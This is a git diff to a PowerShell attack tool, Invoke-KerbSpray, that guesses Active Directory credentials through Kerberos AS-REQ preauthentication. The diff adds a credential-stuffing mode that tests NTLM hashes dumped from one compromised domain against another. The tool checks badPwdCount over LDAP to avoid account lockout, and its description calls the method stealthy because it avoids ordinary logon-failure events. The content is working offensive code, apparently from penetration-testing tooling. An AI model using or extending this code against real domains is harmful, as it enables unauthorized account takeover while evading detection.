@@ -8,6 +8,7 @@ function Invoke-KerbSpray {
 .DESCRIPTION
     Invoke-KerbSpray checks usernames and passwords (plain-text or NTLM hashes) by sending Kerberos AS-REQ.
     Spraying attack can be performed against all the domain users retrieved from LDAP directory, while checking their "badPwdCount" attribute to prevent account lockout and identify previous passwords.
+    Stuffing attack can be performed using NTLM password hashes retrieved from an Active Directory domain in order to identify credential reuse between this compromised domain and a target domain.
     Since failing Kerberos preauthentication does not trigger traditional logon failure event, it is a stealthy way to credential guessing.
     It is highly inspired from Rubeus (by @harmj0y) for the Kerberos part and from Invoke-BadPwdCountScanner (by @rindert-fox) for the LDAP part.
 
@@ -232,11 +233,20 @@ function Invoke-KerbSpray {
             $user = $dump[0]
             if ($user) {
                 if ($user.Contains('\')) {
-                    $user = $user.split('\')[1]
+                    $username = $user.split('\')[1]
                 }
-                $nthash = $dump[3]
-                $cred = @{Username = $user; Password = $Password; Hash = $nthash; BadPwdCount = $badPwdCount}
-                $credentials.add($cred) | Out-Null
+                if ($Ldap) {
+                    $filter = "(samAccountName=$username)"
+                    $badPwdCount = (Get-LdapObject -ADSpath $ADSpath -Filter $filter -Properties badPwdCount -LdapUser $LdapUser -LdapPass $LdapPass).badPwdCount
+                    if ($badPwdCount -eq $null) {
+                        Write-Verbose "$($username)@$($Domain) does not exist"
+                    }
+                }
+                if ($badPwdCount -ne $null -or -not $Ldap) {
+                    $nthash = $dump[3]
+                    $cred = @{Username = $username; Password = $null; Hash = $nthash; BadPwdCount = $badPwdCount}
+                    $credentials.add($cred) | Out-Null
+                }
             }
         }
     }
@@ -345,15 +355,15 @@ function Local:New-KerberosSpray {
             continue
         }
         elseif ($cred.Password) {
-            # Kerberos preauthentication using plain-text password (bruteforce)
+            # Kerberos preauthentication using plain-text password (spraying)
             $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Password $cred.Password -Domain $Domain -Server $Server
         }
         elseif ($cred.Hash) {
-            # Kerberos preauthentication using NTLM hash (pass-the-key)
+            # Kerberos preauthentication using NTLM hash (stuffing)
             $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Hash $cred.Hash -Domain $Domain -Server $Server
         }
         else {
-            # Kerberos preauthentication without credentials (user enumeration)
+            # Kerberos preauthentication without credentials (enumeration)
             $asn_AS_REP = New-KerbPreauth -UserName $cred.Username -Domain $Domain -Server $Server
         }
         $tag = $asn_AS_REP.TagValue
@@ -748,8 +758,8 @@ function Local:KerberosPasswordHash {
         $Count = 4096
     )
 
-    $KERB_ECRYPT = [Type][Win32+KERB_ECRYPT]
-    $UNICODE_STRING = [Type][Win32+UNICODE_STRING]
+    $KERB_ECRYPT = [Win32+KERB_ECRYPT]
+    $UNICODE_STRING = [Win32+UNICODE_STRING]
 
     $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
     $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
@@ -793,7 +803,7 @@ function Local:KerberosEncrypt {
         $data
     )
 
-    $KERB_ECRYPT = [Type][Win32+KERB_ECRYPT]
+    $KERB_ECRYPT = [Win32+KERB_ECRYPT]
 
     $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
     $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
